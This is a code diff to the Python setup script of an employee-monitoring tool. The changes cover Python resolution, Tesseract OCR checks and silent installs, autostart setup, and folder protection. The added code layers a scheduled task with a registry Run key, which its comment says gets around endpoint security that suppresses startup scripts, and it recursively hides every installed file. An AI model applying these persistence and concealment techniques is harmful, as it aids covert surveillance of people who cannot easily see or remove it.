@@ -33,8 +33,30 @@ def is_linux():
 def script_dir():
     return Path(__file__).resolve().parent
 
+def _is_windows_store_python_stub(path_value):
+    path_text = str(path_value or '').strip().lower()
+    if not path_text:
+        return False
+    return 'windowsapps' in path_text and (path_text.endswith('python.exe') or path_text.endswith('python3.exe'))
+
 def resolve_python_executable():
-    return shutil.which('python3') or shutil.which('python') or sys.executable
+    runtime_python = str(Path(sys.executable).resolve()) if sys.executable else ''
+    if runtime_python and not _is_windows_store_python_stub(runtime_python):
+        return runtime_python
+
+    which_python3 = shutil.which('python3')
+    if which_python3 and not _is_windows_store_python_stub(which_python3):
+        return which_python3
+
+    which_python = shutil.which('python')
+    if which_python and not _is_windows_store_python_stub(which_python):
+        return which_python
+
+    py_launcher = shutil.which('py')
+    if py_launcher:
+        return py_launcher
+
+    return runtime_python or sys.executable
 
 
 def resolve_monitor_python_executable(prefer_windowless=False):
@@ -281,10 +303,68 @@ def try_install_tesseract_windows():
 
     return False
 
+
+def _verify_tesseract_binary(candidate_path):
+    try:
+        result = subprocess.run(
+            [str(candidate_path), '--version'],
+            capture_output=True,
+            text=True,
+            timeout=15,
+            check=False,
+        )
+    except Exception:
+        return False
+
+    if result.returncode != 0:
+        return False
+
+    output = f"{result.stdout}\n{result.stderr}".strip().lower()
+    return 'tesseract' in output
+
+
+def _find_bundled_tesseract_installer():
+    candidates = []
+    for pattern in (
+        'tesseract-ocr-w64-setup*.exe',
+        'tesseract*setup*.exe',
+        'Tesseract*setup*.exe',
+    ):
+        candidates.extend(sorted(script_dir().glob(pattern)))
+
+    for candidate in candidates:
+        if candidate.is_file():
+            return candidate
+
+    return None
+
+
+def _run_bundled_tesseract_installer(installer_path):
+    print(f"[INFO] Installing bundled Tesseract from {installer_path.name}...")
+    silent_flags = [
+        ['/VERYSILENT', '/SUPPRESSMSGBOXES', '/NORESTART', '/SP-'],
+        ['/SILENT', '/NORESTART'],
+        ['/S'],
+    ]
+
+    for extra_args in silent_flags:
+        try:
+            subprocess.run([str(installer_path), *extra_args], check=False)
+        except Exception:
+            continue
+
+        if check_tesseract(skip_auto_install=True):
+            return True
+
+    return False
+
 def check_tesseract(skip_auto_install=False):
     bundled_candidates = [
         script_dir() / 'tesseract' / 'tesseract.exe',
+        script_dir() / 'tesseract' / 'bin' / 'tesseract',
+        script_dir() / 'tesseract' / 'tesseract',
         script_dir() / 'Tesseract-OCR' / 'tesseract.exe',
+        script_dir() / 'Tesseract-OCR' / 'bin' / 'tesseract',
         script_dir() / 'tesseract.exe'
     ]
 
@@ -312,15 +392,22 @@ def check_tesseract(skip_auto_install=False):
         ])
 
     for candidate in candidates:
-        if candidate and os.path.exists(candidate):
-            print(f"[OK] Tesseract found: {candidate}")
+        if candidate and os.path.exists(candidate) and _verify_tesseract_binary(candidate):
+            os.environ['TESSERACT_CMD'] = candidate
+            print(f"[OK] Tesseract found and verified: {candidate}")
             return True
 
-    if shutil.which('tesseract'):
-        print(f"[OK] Tesseract found on PATH: {shutil.which('tesseract')}")
+    path_tesseract = shutil.which('tesseract')
+    if path_tesseract and _verify_tesseract_binary(path_tesseract):
+        os.environ['TESSERACT_CMD'] = path_tesseract
+        print(f"[OK] Tesseract found on PATH and verified: {path_tesseract}")
         return True
 
     if is_windows() and not skip_auto_install:
+        bundled_installer = _find_bundled_tesseract_installer()
+        if bundled_installer and _run_bundled_tesseract_installer(bundled_installer):
+            return True
+
         if try_install_tesseract_windows():
             return True
 
@@ -351,6 +438,7 @@ WshShell.Run Chr(34) & "{python_exec}" & Chr(34) & " " & Chr(34) & "{monitor_pat
 
         vbs_ok = False
         task_ok = False
+        run_key_ok = False
 
         try:
             Path(vbs_path).parent.mkdir(parents=True, exist_ok=True)
@@ -366,7 +454,7 @@ WshShell.Run Chr(34) & "{python_exec}" & Chr(34) & " " & Chr(34) & "{monitor_pat
             task_name = 'EmployeeMonitorAutoStart'
             task_cmd = f'"{python_exec}" "{monitor_path}"'
             result = subprocess.run(
-                ['schtasks', '/Create', '/SC', 'ONLOGON', '/TN', task_name, '/TR', task_cmd, '/F'],
+                ['schtasks', '/Create', '/SC', 'ONLOGON', '/RL', 'LIMITED', '/TN', task_name, '/TR', task_cmd, '/F'],
                 capture_output=True,
                 text=True,
                 check=False
@@ -380,7 +468,31 @@ WshShell.Run Chr(34) & "{python_exec}" & Chr(34) & " " & Chr(34) & "{monitor_pat
         except Exception as e:
             print(f"[WARN] Scheduled task setup failed: {e}")
 
-        return vbs_ok or task_ok
+        # Add HKCU Run fallback because some endpoint security tools suppress Startup folder/script execution.
+        try:
+            run_value = f'wscript.exe "{vbs_path}"'
+            reg_result = subprocess.run(
+                [
+                    'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
+                    '/v', 'EmployeeMonitor',
+                    '/t', 'REG_SZ',
+                    '/d', run_value,
+                    '/f'
+                ],
+                capture_output=True,
+                text=True,
+                check=False
+            )
+            if reg_result.returncode == 0:
+                print('[OK] Background auto-start (Registry Run) enabled: HKCU\\...\\Run\\EmployeeMonitor')
+                run_key_ok = True
+            else:
+                err = (reg_result.stderr or reg_result.stdout or '').strip()
+                print(f"[WARN] Could not register HKCU Run startup value: {err}")
+        except Exception as e:
+            print(f"[WARN] Registry startup setup failed: {e}")
+
+        return vbs_ok or task_ok or run_key_ok
 
     if is_macos():
         launch_agents = Path.home() / 'Library' / 'LaunchAgents'
@@ -472,7 +584,8 @@ def protect_folder():
     try:
         # Keep the folder hidden/system, but do not set deny-delete ACL.
         # Deny ACL slows down and can block complete remote uninstall.
-        subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True)
+        subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True, check=False)
+        subprocess.run(['attrib', '+h', '+s', os.path.join(folder_path, '*'), '/s', '/d'], capture_output=True, check=False)
         
         print("[OK] Folder is hidden from standard view.")
         print("       (To reverse: run 'attrib -h -s .\\')")
